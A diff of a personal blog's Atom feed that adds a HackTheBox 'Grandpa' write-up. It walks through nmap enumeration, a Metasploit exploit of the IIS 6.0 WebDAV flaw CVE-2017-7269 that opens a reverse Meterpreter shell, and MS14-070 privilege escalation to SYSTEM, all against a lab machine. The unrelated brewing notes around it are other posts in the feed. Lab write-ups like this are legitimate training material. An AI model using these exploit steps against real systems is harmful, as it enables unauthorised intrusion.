@@ -1,4 +1,255 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-07-23T23:12:14-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Active Denial System</title><subtitle></subtitle><author><name>wittr</name></author><entry><title type="html">HackTheBox - Optimum</title><link href="http://localhost:4000/writeups/2020/07/20/HTB-Optimum.html" rel="alternate" type="text/html" title="HackTheBox - Optimum" /><published>2020-07-20T23:21:00-05:00</published><updated>2020-07-20T23:21:00-05:00</updated><id>http://localhost:4000/writeups/2020/07/20/HTB-Optimum</id><content type="html" xml:base="http://localhost:4000/writeups/2020/07/20/HTB-Optimum.html">&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Optimum/Optimum.png&quot; alt=&quot;Optimum&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-07-29T21:55:51-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Active Denial System</title><subtitle></subtitle><author><name>wittr</name></author><entry><title type="html">HackTheBox - Grandpa</title><link href="http://localhost:4000/writeups/2020/07/23/HTB-Grandpa.html" rel="alternate" type="text/html" title="HackTheBox - Grandpa" /><published>2020-07-23T23:12:00-05:00</published><updated>2020-07-23T23:12:00-05:00</updated><id>http://localhost:4000/writeups/2020/07/23/HTB-Grandpa</id><content type="html" xml:base="http://localhost:4000/writeups/2020/07/23/HTB-Grandpa.html">&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Grandpa/Grandpa.png&quot; alt=&quot;Grandpa&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+
+&lt;p&gt;Grandpa is a very easy Windows box that deals with learning about a couple vulnerabilities.  The enumeration is very straightforward and the foothold is established by exploiting &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269&quot;&gt;CVE-2017-7269&lt;/a&gt;.  After gaining a foothold the path to administrator can also be done via another vulnerability.  First I had to migrate to a process that allowed for the exploitation to occur but then &lt;a href=&quot;https://www.exploit-db.com/exploits/35936&quot;&gt;CVE-2014-4076&lt;/a&gt; succeeded to gain an administrative shell.&lt;/p&gt;
+
+&lt;h2 id=&quot;walkthrough&quot;&gt;Walkthrough&lt;/h2&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;nmap -A -T4 -v 10.10.10.14
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-webdav-scan:
+|   Server Date: Fri, 24 Jul 2020 02:38:43 GMT
+|   WebDAV type: Unknown
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   Server Type: Microsoft-IIS/6.0
+|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Service Info: OS: Windows;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;CPE: cpe:/o:microsoft:windows
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s checkout the website.  A simple under construction page it looks like:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Grandpa/grandpa-website.png&quot; alt=&quot;Grandpa website&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;foothold&quot;&gt;Foothold&lt;/h3&gt;
+
+&lt;p&gt;I noticed with the nmap scan it is showing IIS 6.0, so based off how old that is I’m guessing there’s a CVE involved.  Basically googling “IIS 6.0 remote code execution” and I come across a WebDAV buffer overflow vulnerability (&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269&quot;&gt;CVE-2017-7269&lt;/a&gt;).  There’s a &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/pull/8162&quot;&gt;metasploit exploit&lt;/a&gt; to use here.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;msf5 &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;show options
+&lt;span class=&quot;go&quot;&gt;
+Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   MAXPATHLENGTH  60               yes       End of physical path brute force
+   MINPATHLENGTH  3                yes       Start of physical path brute force
+   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;   RPORT          80               yes       The target port (TCP)
+   SSL            false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI      /                yes       Path of IIS 6 web application
+   VHOST                           no        HTTP server virtual host
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Windows Server 2003 R2 SP2 x86
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 10.10.10.14
+&lt;span class=&quot;gp&quot;&gt;RHOSTS =&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;10.10.10.14
+&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;run
+&lt;span class=&quot;go&quot;&gt;
+[*] Started reverse TCP handler on 10.10.14.2:4444
+[*] Trying path length 3 to 60 ...
+[*] Sending stage (176195 bytes) to 10.10.10.14
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[*] Meterpreter session 1 opened (10.10.14.2:4444 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;10.10.10.14:1030&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-07-23 21:45:25 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;getuid failed within meterpreter so I dropped to a shell and discovered I’m running as NETWORK SERVICE.  Poking around the file system I do see a user “Harry” in C:\Documents and Settings\&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Grandpa/docsandsettings.png&quot; alt=&quot;docsandsettings&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;user&quot;&gt;User&lt;/h3&gt;
+
+&lt;p&gt;After some poking around, I wasn’t sure how to pivot to ‘Harry’ so I dropped back to the meterpreter shell and checked the sysinfo.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;sysinfo
+&lt;span class=&quot;go&quot;&gt;Computer        : GRANPA
+OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2)
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 2
+Meterpreter     : x86/windows
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I googled once again. “&lt;em&gt;Windows .NET Server (5.2 Build 3790, Service Pack 2) privesc&lt;/em&gt;” returned a result containing &lt;a href=&quot;https://www.exploit-db.com/exploits/35936&quot;&gt;CVE-2014-4076&lt;/a&gt; (second result).  Time to check if metasploit has this already.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;msf5 post(multi/recon/local_exploit_suggester) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;search ms14_070
+&lt;span class=&quot;go&quot;&gt;
+Matching Modules
+================
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;   #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;Name                                        Disclosure Date  Rank     Check  Description
+&lt;span class=&quot;go&quot;&gt;   -  ----                                        ---------------  ----     -----  -----------
+   0  exploit/windows/local/ms14_070_tcpip_ioctl  2014-11-11       average  Yes    MS14-070 Windows tcpip!SetAddrOptions NULL Pointer Dereference
+
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;msf5 post(multi/recon/local_exploit_suggester) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Jackpot.&lt;/p&gt;
+
+&lt;p&gt;I basically skipped pivoting to user and went straight to exploiting to admin via the above exploit in metasploit.  I got access to user.txt via the administrative shell in the next section.&lt;/p&gt;
+
+&lt;h3 id=&quot;root&quot;&gt;Root&lt;/h3&gt;
+
+&lt;p&gt;Let’s run the privesc exploit.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;msf5 post(multi/recon/local_exploit_suggester) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;use exploit/windows/local/ms14_070_tcpip_ioctl
+&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;show options
+&lt;span class=&quot;go&quot;&gt;
+Module options (exploit/windows/local/ms14_070_tcpip_ioctl):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Server 2003 SP2
+
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SESSION 1
+&lt;span class=&quot;gp&quot;&gt;SESSION =&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;1
+&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;run
+&lt;span class=&quot;go&quot;&gt;
+[*] Started reverse TCP handler on 10.0.2.15:4444
+[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
+[*] Exploit completed, but no session was created.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Wut. I haven’t migrated yet, so I tried migrating to a new process to see if I have better luck.  While looking to migrate I was disconnected.  So I re-executed my initial payload on the machine and now my SESSION is 2.  Let’s migrate.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ps
+&lt;span class=&quot;go&quot;&gt;
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System
+ 272   4     smss.exe
+ 324   272   csrss.exe
+ 348   272   winlogon.exe
+ 396   348   services.exe
+ 408   348   lsass.exe
+ 600   396   svchost.exe
+ 684   396   svchost.exe
+ 740   396   svchost.exe
+ 768   396   svchost.exe
+ 804   396   svchost.exe
+ 940   396   spoolsv.exe
+ 968   396   msdtc.exe
+ 1080  396   cisvc.exe
+ 1124  396   svchost.exe
+ 1184  396   inetinfo.exe
+ 1220  396   svchost.exe
+ 1332  396   VGAuthService.exe
+ 1412  396   vmtoolsd.exe
+ 1460  396   svchost.exe
+ 1636  396   alg.exe
+ 1692  396   svchost.exe
+ 1776  600   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 1916  396   dllhost.exe
+ 2192  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 2260  600   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 2308  2192  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
+ 2492  600   wmiprvse.exe
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;migrate 2260
+&lt;span class=&quot;go&quot;&gt;[*] Migrating from 2308 to 2260...
+[*] Migration completed successfully.
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;background
+&lt;span class=&quot;go&quot;&gt;[*] Backgrounding session 2...
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;use exploit/windows/local/ms14_070_tcpip_ioctl
+&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;show options
+&lt;span class=&quot;go&quot;&gt;
+Module options (exploit/windows/local/ms14_070_tcpip_ioctl):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Server 2003 SP2
+
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 10.10.14.2
+&lt;span class=&quot;gp&quot;&gt;LHOST =&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;10.10.14.2
+&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SESSION 2
+&lt;span class=&quot;gp&quot;&gt;SESSION =&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;2
+&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;run
+&lt;span class=&quot;go&quot;&gt;
+[*] Started reverse TCP handler on 10.10.14.2:4444
+[*] Storing the shellcode in memory...
+[*] Triggering the vulnerability...
+[*] Checking privileges after exploitation...
+[+] Exploitation successful!
+[*] Sending stage (176195 bytes) to 10.10.10.14
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[*] Meterpreter session 3 opened (10.10.14.2:4444 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;10.10.10.14:1031&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-07-23 22:42:37 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;background
+&lt;span class=&quot;go&quot;&gt;[*] Backgrounding session 3...
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;sessions
+&lt;span class=&quot;go&quot;&gt;
+Active sessions
+===============
+
+  Id  Name  Type                     Information                            Connection
+  --  ----  ----                     -----------                            ----------
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  2         meterpreter x86/windows  NT AUTHORITY\NETWORK SERVICE @ GRANPA  10.10.14.2:4444 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;10.10.10.14:1030 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.14&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ GRANPA           10.10.14.2:4444 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;10.10.10.14:1031 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.14&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And with that, I use the administrative session to pull the flags.&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/local/ms14_070_tcpip_ioctl) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;sessions 3
+&lt;span class=&quot;go&quot;&gt;[*] Starting interaction with 3...
+
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ocuments and Settings&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;arry&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ser.txt&quot;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;bdff ...
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ocuments and Settings&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dministrator&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;oot.txt&quot;&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;9359 ...
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h3&gt;
+
+&lt;p&gt;Overall this box was mainly about enumerating for me.  I had to do some Google Fu to find the correct CVEs to exploit.  Since it was super easy with metasploit it was a good repetition of using metasploit and the merits of migrating processes after gaining a foothold to try exploits when they fail the first time.  Overall a straightforward box.  Onto the next one!&lt;/p&gt;</content><author><name>wittr</name></author><category term="writeups" /><summary type="html">Summary Grandpa is a very easy Windows box that deals with learning about a couple vulnerabilities. The enumeration is very straightforward and the foothold is established by exploiting CVE-2017-7269. After gaining a foothold the path to administrator can also be done via another vulnerability. First I had to migrate to a process that allowed for the exploitation to occur but then CVE-2014-4076 succeeded to gain an administrative shell. Walkthrough Enumeration nmap -A -T4 -v 10.10.10.14 PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Server Date: Fri, 24 Jul 2020 02:38:43 GMT | WebDAV type: Unknown | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | Server Type: Microsoft-IIS/6.0 |_ Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Let’s checkout the website. A simple under construction page it looks like: Foothold I noticed with the nmap scan it is showing IIS 6.0, so based off how old that is I’m guessing there’s a CVE involved. Basically googling “IIS 6.0 remote code execution” and I come across a WebDAV buffer overflow vulnerability (CVE-2017-7269). There’s a metasploit exploit to use here. msf5 &amp;gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &amp;gt; show options Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl): Name Current Setting Required Description ---- --------------- -------- ----------- MAXPATHLENGTH 60 yes End of physical path brute force MINPATHLENGTH 3 yes Start of physical path brute force Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path of IIS 6 web application VHOST no HTTP server virtual host Exploit target: Id Name -- ---- 0 Microsoft Windows Server 2003 R2 SP2 x86 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &amp;gt; set RHOSTS 10.10.10.14 RHOSTS =&amp;gt; 10.10.10.14 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &amp;gt; run [*] Started reverse TCP handler on 10.10.14.2:4444 [*] Trying path length 3 to 60 ... [*] Sending stage (176195 bytes) to 10.10.10.14 [*] Meterpreter session 1 opened (10.10.14.2:4444 -&amp;gt; 10.10.10.14:1030) at 2020-07-23 21:45:25 -0500 meterpreter &amp;gt; getuid failed within meterpreter so I dropped to a shell and discovered I’m running as NETWORK SERVICE. Poking around the file system I do see a user “Harry” in C:\Documents and Settings\ User After some poking around, I wasn’t sure how to pivot to ‘Harry’ so I dropped back to the meterpreter shell and checked the sysinfo. meterpreter &amp;gt; sysinfo Computer : GRANPA OS : Windows .NET Server (5.2 Build 3790, Service Pack 2) Architecture : x86 System Language : en_US Domain : HTB Logged On Users : 2 Meterpreter : x86/windows meterpreter &amp;gt; I googled once again. “Windows .NET Server (5.2 Build 3790, Service Pack 2) privesc” returned a result containing CVE-2014-4076 (second result). Time to check if metasploit has this already. ```console msf5 post(multi/recon/local_exploit_suggester) &amp;gt; search ms14_070 Matching Modules # Name Disclosure Date Rank Check Description 0 exploit/windows/local/ms14_070_tcpip_ioctl 2014-11-11 average Yes MS14-070 Windows tcpip!SetAddrOptions NULL Pointer Dereference</summary></entry><entry><title type="html">HackTheBox - Optimum</title><link href="http://localhost:4000/writeups/2020/07/20/HTB-Optimum.html" rel="alternate" type="text/html" title="HackTheBox - Optimum" /><published>2020-07-20T23:21:00-05:00</published><updated>2020-07-20T23:21:00-05:00</updated><id>http://localhost:4000/writeups/2020/07/20/HTB-Optimum</id><content type="html" xml:base="http://localhost:4000/writeups/2020/07/20/HTB-Optimum.html">&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Optimum/Optimum.png&quot; alt=&quot;Optimum&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
 
@@ -895,59 +1146,4 @@ exploding the mind, and erupting from the crown of my skull.
   &lt;li&gt;2-3 weeks to condition, max 3&lt;/li&gt;
   &lt;li&gt;If OG 1.030 –&amp;gt; Drink within 2 months&lt;/li&gt;
   &lt;li&gt;If OG is higher –&amp;gt; Drink within 6 months&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>wittr</name></author><category term="beer" /><summary type="html">RIP Apple MBP Just wanted to hold a moment of silence in this post for my 2011 Macbook Pro that officially died this morning. /sadface After a lot of troubleshooting I narrowed it down to the keyboard’s power button and ended up ripping it all open and replacing the keyboard. The power button did work after that and I felt a moment of accomplishment. It continued to work up until I had to plug in the power cord to charge it. Overnight it charged while in “hibernation” due to being idle. Next day - nothing from the power button. Going through all the troubleshooting - no dice. Therefore, I’m going to conclude that there was a short going on somewhere that bricked the board when I hooked up the power and I’m moving on. I’ve still got my Samsung ultrabook to keep me company. Well - onto the brewing notes! I recently attended a brewing 101 session. I brewed for maybe 2 years off and on but never really tried to greatly improve. This time will hopefully be different. Key notes from the session below. Brew 101 Notes General Mark 5 gallons on fermenter for ease of use Do not use distilled water - no minerals Even temperatures during fermentation help yeast prevent off flavors Certain kinds of beer - higher fermentation temps help flavor (ie. bavarian hefeweizen and banana clove flavor) Think about a bag over a fermenter in case of eruption Avoid aluminum pots because they heat too quickly Don’t add nuts or anything with high fat to beer White Vinegar can clean a copper wort chiller OG - if lower than expected - expect to drink beer faster. If above, can dilute the wort before fermentation with extra water. Type Hops Flavor Grain Flavor American Piney Dry British Herbal/Earthy Bread-y German Mix of above Mix of above Belgian/French Pepper/Flower-y Biscuit New Zealand/Australia Tropical Fruit —— Procedure Prep Everything should be “Visibility” clean Cleanliness is the most important thing to brewing good beer CLEAN - PBW is your friend Fermenter - 30 min soak 